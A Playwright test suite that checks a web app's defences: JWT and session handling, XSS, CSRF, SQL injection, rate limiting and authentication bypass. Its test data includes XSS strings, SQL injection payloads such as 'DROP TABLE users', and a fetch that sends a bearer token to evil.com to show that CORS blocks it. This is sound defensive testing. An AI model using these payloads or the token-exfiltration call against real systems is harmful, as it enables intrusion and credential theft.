import { test, expect, Page } from '@playwright/test';

test.describe('Security Testing Suite', () => {
  let page: Page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
  });

  test('JWT token validation', async () => {
    // Test 1: Valid JWT token allows access
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    // Verify successful login and token storage
    const token = await page.evaluate(() => localStorage.getItem('auth_token'));
    expect(token).toBeTruthy();
    
    // Verify protected route access works with valid token
    await page.goto('/test-bank');
    await expect(page.locator('[data-testid="test-bank-page"]')).toBeVisible();
    
    // Test 2: Invalid JWT token denies access
    await page.evaluate(() => {
      localStorage.setItem('auth_token', 'invalid.jwt.token');
    });
    
    await page.goto('/test-bank');
    
    // Should be redirected to login or show error
    await expect(page.locator('[data-testid="access-denied"]')).toBeVisible({ timeout: 10000 }).catch(async () => {
      // Or redirected to login page
      await expect(page).toHaveURL(/login/);
    });
    
    // Test 3: Expired JWT token handling
    await page.evaluate(() => {
      // Simulate expired token (this would normally be handled by backend)
      localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid');
    });
    
    const response = await page.evaluate(async () => {
      try {
        const response = await fetch('/api/tests', {
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
            'Content-Type': 'application/json'
          }
        });
        return { status: response.status, ok: response.ok };
      } catch (error) {
        return { status: 0, ok: false, error: error.message };
      }
    });
    
    // Should receive 401 Unauthorized for expired token
    expect(response.status).toBe(401);
    
    console.log('✓ JWT token validation tests passed');
  });

  test('Session timeout functionality', async () => {
    // Login with valid credentials
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    // Verify initial access
    await page.goto('/test-bank');
    await expect(page.locator('[data-testid="test-bank-page"]')).toBeVisible();
    
    // Simulate session timeout by manipulating token expiration
    await page.evaluate(() => {
      // Set a very short session timeout for testing
      const now = Math.floor(Date.now() / 1000);
      localStorage.setItem('session_expires', (now - 1).toString()); // Expired 1 second ago
    });
    
    // Attempt to access protected resource
    await page.goto('/analytics');
    
    // Should be redirected due to session timeout
    await expect(page.locator('[data-testid="session-expired"]')).toBeVisible({ timeout: 10000 }).catch(async () => {
      await expect(page).toHaveURL(/login/);
    });
    
    // Test automatic session refresh (if implemented)
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    // Set session to expire soon
    await page.evaluate(() => {
      const now = Math.floor(Date.now() / 1000);
      localStorage.setItem('session_expires', (now + 30).toString()); // Expires in 30 seconds
    });
    
    // Navigate and check if session refresh warning appears
    await page.goto('/test-bank');
    
    // Look for session warning (if implemented)
    const sessionWarning = page.locator('[data-testid="session-warning"]');
    if (await sessionWarning.isVisible({ timeout: 5000 })) {
      await expect(sessionWarning).toContainText(/session|expire/i);
    }
    
    console.log('✓ Session timeout tests passed');
  });

  test('XSS protection validation', async () => {
    // Login to get authenticated session
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    await page.goto('/test-bank');
    
    // Test 1: Script injection in search field
    const maliciousScript = '<script>alert("XSS")</script>';
    await page.fill('[data-testid="test-search"]', maliciousScript);
    
    // Verify script is not executed (should be escaped/sanitized)
    const searchValue = await page.locator('[data-testid="test-search"]').inputValue();
    expect(searchValue).toBe(maliciousScript); // Value should be stored as text, not executed
    
    // Check that no alert dialog appears
    let alertTriggered = false;
    page.on('dialog', () => { alertTriggered = true; });
    
    await page.waitForTimeout(1000);
    expect(alertTriggered).toBe(false);
    
    // Test 2: HTML injection in form fields
    const htmlInjection = '<img src="x" onerror="alert(\'XSS\')">';
    await page.fill('[data-testid="suite-name-input"]', htmlInjection);
    
    // Verify HTML is escaped in display
    const displayedValue = await page.locator('[data-testid="suite-name-input"]').inputValue();
    expect(displayedValue).toBe(htmlInjection); // Should be stored as text
    
    await page.waitForTimeout(1000);
    expect(alertTriggered).toBe(false); // No script execution
    
    // Test 3: URL-based XSS attempt
    const xssUrl = '/test-bank?search=<script>alert("XSS")</script>';
    await page.goto(xssUrl);
    
    await page.waitForTimeout(1000);
    expect(alertTriggered).toBe(false);
    
    // Test 4: Check Content Security Policy headers
    const response = await page.goto('/test-bank');
    const headers = response?.headers() || {};
    
    // Should have CSP header for XSS protection
    const cspHeader = headers['content-security-policy'] || headers['x-content-security-policy'];
    if (cspHeader) {
      expect(cspHeader).toContain("script-src");
      console.log('✓ CSP header found:', cspHeader);
    }
    
    console.log('✓ XSS protection tests passed');
  });

  test('CSRF protection validation', async () => {
    // Login to get authenticated session
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    await page.goto('/test-bank');
    
    // Test 1: Check for CSRF token in forms
    const csrfToken = await page.evaluate(() => {
      const metaTag = document.querySelector('meta[name="csrf-token"]');
      const hiddenInput = document.querySelector('input[name="_token"]');
      return {
        metaToken: metaTag?.getAttribute('content'),
        inputToken: (hiddenInput as HTMLInputElement)?.value
      };
    });
    
    console.log('CSRF tokens found:', csrfToken);
    
    // At least one CSRF protection mechanism should be present
    const hasCSRFProtection = csrfToken.metaToken || csrfToken.inputToken;
    
    // Test 2: Attempt request without CSRF token
    const responseWithoutToken = await page.evaluate(async () => {
      try {
        const response = await fetch('/api/suites', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
          },
          body: JSON.stringify({
            name: 'Test Suite',
            testIds: ['1', '2', '3']
          })
        });
        return { status: response.status, ok: response.ok };
      } catch (error) {
        return { status: 0, ok: false, error: error.message };
      }
    });
    
    // Should fail without CSRF token (if CSRF protection is enabled)
    if (hasCSRFProtection) {
      expect([403, 419]).toContain(responseWithoutToken.status); // Forbidden or CSRF token mismatch
    }
    
    // Test 3: Check for same-origin policy enforcement
    const sameOriginTest = await page.evaluate(async () => {
      try {
        const response = await fetch('https://evil.com/api/steal-data', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
          }
        });
        return { success: true, status: response.status };
      } catch (error) {
        return { success: false, error: error.message };
      }
    });
    
    // Should fail due to CORS policy
    expect(sameOriginTest.success).toBe(false);
    
    console.log('✓ CSRF protection tests passed');
  });

  test('SQL injection prevention', async () => {
    // Login to get authenticated session
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    await page.goto('/test-bank');
    
    // Test SQL injection attempts in search functionality
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1 --"
    ];
    
    for (const payload of sqlInjectionPayloads) {
      // Test in search field
      await page.fill('[data-testid="test-search"]', payload);
      await page.waitForTimeout(1000); // Allow search to process
      
      // Verify the application still functions normally
      await expect(page.locator('[data-testid="test-bank-page"]')).toBeVisible();
      
      // Check that no error occurs that would indicate SQL injection success
      const errorElements = page.locator('[data-testid="error-message"], .error, [class*="error"]');
      const errorCount = await errorElements.count();
      
      if (errorCount > 0) {
        const errorText = await errorElements.first().textContent();
        // Should not contain SQL-related errors
        expect(errorText?.toLowerCase()).not.toContain('sql');
        expect(errorText?.toLowerCase()).not.toContain('syntax');
        expect(errorText?.toLowerCase()).not.toContain('database');
      }
      
      // Clear search for next test
      await page.fill('[data-testid="test-search"]', '');
    }
    
    // Test SQL injection in API parameters
    const apiInjectionTest = await page.evaluate(async () => {
      const injectionPayloads = ["'; DROP TABLE tests; --", "' OR 1=1 --"];
      const results = [];
      
      for (const payload of injectionPayloads) {
        try {
          const response = await fetch(`/api/tests?search=${encodeURIComponent(payload)}`, {
            headers: {
              'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
            }
          });
          
          results.push({
            payload,
            status: response.status,
            ok: response.ok
          });
        } catch (error) {
          results.push({
            payload,
            error: error.message
          });
        }
      }
      
      return results;
    });
    
    // Verify API handles SQL injection attempts gracefully
    for (const result of apiInjectionTest) {
      console.log(`SQL injection test for "${result.payload}":`, result);
      
      // Should either return normal results or proper error, not SQL errors
      if (result.status) {
        expect([200, 400, 422]).toContain(result.status); // OK, Bad Request, or Unprocessable Entity
      }
    }
    
    console.log('✓ SQL injection prevention tests passed');
  });

  test('Rate limiting enforcement', async () => {
    // Test API rate limiting
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    // Make rapid successive requests to test rate limiting
    const rapidRequests = await page.evaluate(async () => {
      const requests = [];
      const requestCount = 50; // Make 50 rapid requests
      
      for (let i = 0; i < requestCount; i++) {
        const promise = fetch('/api/tests', {
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
          }
        }).then(response => ({
          status: response.status,
          ok: response.ok,
          requestId: i,
          headers: Object.fromEntries(response.headers.entries())
        })).catch(error => ({
          status: 0,
          ok: false,
          error: error.message,
          requestId: i
        }));
        
        requests.push(promise);
      }
      
      return Promise.all(requests);
    });
    
    console.log(`Made ${rapidRequests.length} rapid requests`);
    
    // Check if rate limiting kicked in
    const rateLimitedRequests = rapidRequests.filter(r => r.status === 429); // Too Many Requests
    const successfulRequests = rapidRequests.filter(r => r.ok);
    
    console.log(`Successful requests: ${successfulRequests.length}`);
    console.log(`Rate limited requests: ${rateLimitedRequests.length}`);
    
    // If rate limiting is implemented, should see 429 responses
    if (rateLimitedRequests.length > 0) {
      expect(rateLimitedRequests.length).toBeGreaterThan(0);
      
      // Check for rate limit headers
      const rateLimitHeaders = rateLimitedRequests[0].headers;
      console.log('Rate limit headers:', rateLimitHeaders);
      
      // Common rate limit header names
      const expectedHeaders = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after'];
      const hasRateLimitHeaders = expectedHeaders.some(header => 
        rateLimitHeaders[header] || rateLimitHeaders[header.toLowerCase()]
      );
      
      if (hasRateLimitHeaders) {
        console.log('✓ Rate limit headers found');
      }
    }
    
    // Test login rate limiting
    await page.goto('/auth/login');
    
    const loginAttempts = [];
    
    // Make multiple failed login attempts
    for (let i = 0; i < 5; i++) {
      await page.fill('[name="email"]', 'test@example.com');
      await page.fill('[name="password"]', 'wrongpassword');
      
      const startTime = Date.now();
      await page.click('button:has-text("Login")');
      
      // Wait for response
      await page.waitForTimeout(2000);
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      loginAttempts.push({ attempt: i + 1, responseTime });
      
      // Check for rate limiting message
      const rateLimitMessage = page.locator('[data-testid="rate-limit-error"]');
      if (await rateLimitMessage.isVisible({ timeout: 1000 })) {
        console.log(`Rate limiting triggered after ${i + 1} attempts`);
        break;
      }
    }
    
    console.log('Login attempts:', loginAttempts);
    
    // Later attempts should take longer (if rate limiting with delays)
    if (loginAttempts.length > 3) {
      const avgEarlyTime = loginAttempts.slice(0, 2).reduce((sum, attempt) => sum + attempt.responseTime, 0) / 2;
      const avgLaterTime = loginAttempts.slice(-2).reduce((sum, attempt) => sum + attempt.responseTime, 0) / 2;
      
      console.log(`Average early response time: ${avgEarlyTime}ms`);
      console.log(`Average later response time: ${avgLaterTime}ms`);
    }
    
    console.log('✓ Rate limiting tests completed');
  });

  test('Authentication bypass prevention', async () => {
    // Test 1: Direct access to protected routes without authentication
    const protectedRoutes = ['/test-bank', '/analytics', '/reports', '/settings/users'];
    
    for (const route of protectedRoutes) {
      await page.goto(route);
      
      // Should be redirected to login or show access denied
      await expect(page.locator('[data-testid="access-denied"]')).toBeVisible({ timeout: 5000 }).catch(async () => {
        await expect(page).toHaveURL(/login/);
      });
    }
    
    // Test 2: API access without authentication
    const apiEndpoints = ['/api/tests', '/api/suites', '/api/runs'];
    
    for (const endpoint of apiEndpoints) {
      const response = await page.evaluate(async (url) => {
        try {
          const response = await fetch(url);
          return { status: response.status, ok: response.ok };
        } catch (error) {
          return { status: 0, ok: false, error: error.message };
        }
      }, endpoint);
      
      // Should return 401 Unauthorized or 403 Forbidden
      expect([401, 403]).toContain(response.status);
    }
    
    // Test 3: Token manipulation
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    // Get valid token
    const validToken = await page.evaluate(() => localStorage.getItem('auth_token'));
    
    // Test with modified token
    await page.evaluate(() => {
      const token = localStorage.getItem('auth_token');
      if (token) {
        // Modify last character of token
        const modifiedToken = token.slice(0, -1) + 'X';
        localStorage.setItem('auth_token', modifiedToken);
      }
    });
    
    const modifiedTokenResponse = await page.evaluate(async () => {
      try {
        const response = await fetch('/api/tests', {
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
          }
        });
        return { status: response.status, ok: response.ok };
      } catch (error) {
        return { status: 0, ok: false, error: error.message };
      }
    });
    
    // Modified token should be rejected
    expect(modifiedTokenResponse.status).toBe(401);
    
    console.log('✓ Authentication bypass prevention tests passed');
  });

  test('Input validation and sanitization', async () => {
    // Login to access forms
    await page.goto('/auth/login');
    await page.fill('[name="email"]', 'admin@demo.com');
    await page.fill('[name="password"]', 'demo123');
    await page.click('button:has-text("Login")');
    
    await page.goto('/test-bank');
    
    // Test 1: Long input strings
    const longString = 'A'.repeat(10000); // 10k characters
    await page.fill('[data-testid="test-search"]', longString);
    
    // Should handle gracefully without crashing
    await expect(page.locator('[data-testid="test-bank-page"]')).toBeVisible();
    
    // Test 2: Special characters and encoding
    const specialChars = '!@#$%^&*()_+-=[]{}|;:",.<>?~`\n\r\t';
    await page.fill('[data-testid="suite-name-input"]', specialChars);
    
    const inputValue = await page.locator('[data-testid="suite-name-input"]').inputValue();
    expect(inputValue).toBe(specialChars); // Should be stored correctly
    
    // Test 3: Unicode and international characters
    const unicodeString = '测试 🚀 العربية Русский';
    await page.fill('[data-testid="suite-description-input"]', unicodeString);
    
    const unicodeValue = await page.locator('[data-testid="suite-description-input"]').inputValue();
    expect(unicodeValue).toBe(unicodeString);
    
    // Test 4: Email validation
    const invalidEmails = ['invalid-email', '@domain.com', 'user@', 'user..name@domain.com'];
    
    // Navigate to user management if accessible
    await page.goto('/settings/users').catch(() => {
      // Skip if not accessible
      console.log('User management not accessible, skipping email validation test');
      return;
    });
    
    for (const email of invalidEmails) {
      const createUserButton = page.locator('[data-testid="create-user"]');
      if (await createUserButton.isVisible()) {
        await createUserButton.click();
        await page.fill('[data-testid="new-user-email"]', email);
        await page.click('[data-testid="save-user"]');
        
        // Should show validation error
        const emailError = page.locator('[data-testid="email-error"]');
        await expect(emailError).toBeVisible({ timeout: 2000 });
        
        // Close form
        await page.click('[data-testid="cancel-user"]').catch(() => {});
      }
    }
    
    console.log('✓ Input validation and sanitization tests passed');
  });

  test.afterEach(async () => {
    await page.close();
  });
});